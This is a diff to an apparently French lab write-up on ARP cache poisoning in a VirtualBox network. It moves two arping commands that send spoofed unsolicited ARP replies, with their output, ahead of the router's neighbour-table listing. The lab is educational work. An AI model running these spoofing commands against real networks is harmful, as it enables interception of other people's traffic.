@@ -100,6 +100,16 @@ Le principe de l'attaque pour rappel :
   - utilisez Wireshark pour voir les trames envoyées
 
 ```bash
+[dorian@laptop-dorian ~]$ arping -c 100 -U -s 192.168.56.102 -I vboxnet0 192.168.56.104
+ARPING 192.168.56.104 from 192.168.56.102 vboxnet0
+```
+
+```bash
+[dorian@laptop-dorian ~]$ arping -c 100 -U -s 192.168.56.104 -I vboxnet0 192.168.56.102
+ARPING 192.168.56.102 from 192.168.56.104 vboxnet0
+```
+
+```bash
 [dorian@router ~]$ ip n s
 192.168.56.241 dev enp0s8 lladdr 08:00:27:41:b5:89 STALE 
 192.168.56.104 dev enp0s8 lladdr 0a:00:27:00:00:00 STALE 
@@ -116,16 +126,6 @@ Le principe de l'attaque pour rappel :
 192.168.56.103 dev enp0s3 lladdr 08:00:27:41:b5:89 STALE 
 192.168.56.1 dev enp0s3 lladdr 0a:00:27:00:00:00 REACHABLE 
 192.168.56.100 dev enp0s3 lladdr 08:00:27:d2:59:36 STALE 
-```
-
-```bash
-[dorian@laptop-dorian ~]$ arping -c 100 -U -s 192.168.56.102 -I vboxnet0 192.168.56.104
-ARPING 192.168.56.104 from 192.168.56.102 vboxnet0
-```
-
-```bash
-[dorian@laptop-dorian ~]$ arping -c 100 -U -s 192.168.56.104 -I vboxnet0 192.168.56.102
-ARPING 192.168.56.102 from 192.168.56.104 vboxnet0
 ```
 
 ## III. Aller plus loin
